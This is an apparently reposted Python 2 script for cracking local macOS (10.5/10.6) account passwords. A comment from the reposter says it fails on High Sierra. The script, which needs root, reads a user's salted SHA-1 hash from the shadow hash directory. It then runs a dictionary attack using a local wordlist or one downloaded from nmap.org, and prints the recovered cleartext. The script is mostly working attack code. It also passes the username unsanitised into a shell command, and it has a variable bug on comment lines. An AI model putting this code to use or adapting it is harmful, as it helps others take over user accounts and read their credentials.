#***************************************************
#***************************************************
#* Used for cracking OS X passwords on 10.5 and 10.6
#* Must have UID O!
#* Usage: osx_crack.py <username> [dictionary]
#*
#* Patrick Dunstan
#* http://www.defenceindepth.net
#* 2011
#***************************************************
#***************************************************

# Thank You Patrick!
# https://pastebin.com/Gv6VxEZ7

##* I ran this on macOS High Sierra, and I can't get it to work.
##* Maybe I can upgrade the script?

from subprocess import *
import hashlib
import os
import urllib
import sys

# Online password file:
link = "http://nmap.org/svn/nselib/data/passwords.lst"

# Hash pass and compare:
def check(password):
    # Ignore comments:
    if not password.startswith("#!"):
        create_sha1 = hashlib.sha1(salt_hex + password)
        sha1_guess = create_sha1.hexdigest()
        print(">>> Trying ..." + password)

    if sha1 in sha1_guess.upper():
        print("Cleartext password for user '" + username + "' is : " + password)
        exit(0)

if len(sys.argv) < 2:
    print("Usage: " + sys.argv[0] + " <username> [dictionary]")
    exit()

username = sys.argv[1]

# Pull user information from directory services:
p = Popen("dscl localhost -read /Search/Users/" + username, shell=True, \
    stdout=PIPE)

dscl_out = p.communicate()[0]

if "GeneratedUID" not in dscl_out:
    print("User not found. Sorry")
    exit(0)

list = dscl_out.split("\n")
guid = list[10].split(" ")

# Pull hash from shadow file:
p = Popen("cat /var/db/shadow/hash/" + guid[1], shell=True, stdout=PIPE)
digest = p.communicate()[0]

# https://crackstation.net/hashing-security.htm
# Take a 4 byte salt from the front:
salt = digest[168:176]
# Take the remaining bytes for the hash:
sha1 = digest[177:216]

print("Attempting " + salt + sha1)

# Convert salt to hex:
try:
    salt_hex = chr(int(salt[0:2], 16)) + chr(int(salt[2:4], 16)) + chr(int(salt[4:6], 16)) + chr(int(salt[6:8], 16))
except ValueError:
    print("The salt was not converted. Sorry.")
    exit(0)

# If a dictionary file is specified:
if len(sys.argv) == 3:
    print("Reading from a dictionary file '" + sys.argv[2] + "'.")
    passlist = open(sys.argv[2], "r")
    password = passlist.readline()

    while password:
        check(password.rstrip())
        password = passlist.readline()
    passlist.close()

# If no dictionary file is specified:
else:
    print("You haven't specified a dictionary file. \
    The default is a hardcoded link.")
    # Download the dictionary file:
    passlist = urllib.urlopen(link)
    passwords = passlist.read().split("\n")

    for password in passwords:
        check(password)

print("\nPassword not found. Maybe a different dictionary will work.")
